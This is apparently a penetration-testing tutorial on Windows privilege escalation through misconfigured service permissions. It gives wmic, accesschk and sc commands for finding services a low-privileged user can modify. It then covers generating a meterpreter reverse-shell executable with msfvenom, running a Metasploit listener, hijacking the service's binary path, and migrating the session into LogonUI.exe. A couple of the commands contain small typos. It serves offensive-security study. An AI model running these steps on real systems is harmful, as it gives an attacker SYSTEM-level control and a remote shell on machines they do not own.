Services are ***executable applications running in a system's background***, often automatically starting during boot. They can be controlled (started, stopped, paused, or restarted) depending on access permissions. Services do not have a user interface and typically run under the `LocalSystem` (SYSTEM) account, and this creates a security risks if misconfigurations occur.

Windows has two different commands to gather this information: `wmic` and `sc`.

### Identifying Services
**List all the services**
```
wmic service list brief
```

**Filter the output to show only the relevant services**
```
wmic service where (state="running") get name, caption, startmode, startname
```

**Display the name of the Service with the Caption**
```
wmic service where "caption='Web Account Manager'" get name, caption
```

### Vulnerable Service Permissions
If a low-privileged user has permission to modify the configuration of a service run by an administrator-level account, you can likely hijack the service.
#### Service Permissions
**`AccessChk`** (part of the Windows Sysinternals suite) is a command-line tool that ***checks the permissions of Windows objects – including services***.

**Search for any services that the Restricted1 user account can modify**
```
accesschk.exe -uwcqv "restricted1" *
```
The permissions you should be looking for:
- **SERVICE_ALL_ACCESS** 
- **SERVICE_CHANGE_CONFIG**

#### Finding the Binary Path
To inspect a potentially misconfigured service, use the `sc qc` command in cmd. This will show details like the ***service's start account*** (`SERVICE_START_NAME`), ***how it starts*** (`START_TYPE`), and the ***path to its executable path*** (`BINARY_PATH_NAME`). The executable is crucial, as it can be modified to point to a malicious binary.

**Run the Service Configuration Command**
```
sc qc NAME_OF_SERVICE
```

### Exploiting Vulnerable Services
**Preparation**
To hijack the service executable, you first ***need a malicious executable to plant in the binary path of the service***. You need to ***generate a payload*** on your attacking machine, ***transfer it*** to the target system, and start a Metasploit listener.

**Generate a Payload**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$kaliIPAddress LPORT=4444 -f exe -o reverse.exe
```

**Launch a Listener**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IP
run
```

**Exploitation**
Modify the binary path and restart the service.
```
sc stop SERVICE_NAME
sc config SERVICE_NAME binpath="C\Temp\reverse.exe"
sc start SERVICE_START
```


Note: Migrate to `LogonUI.exe` process before your session is terminated.
```
migrate -N LogonUI.exe
```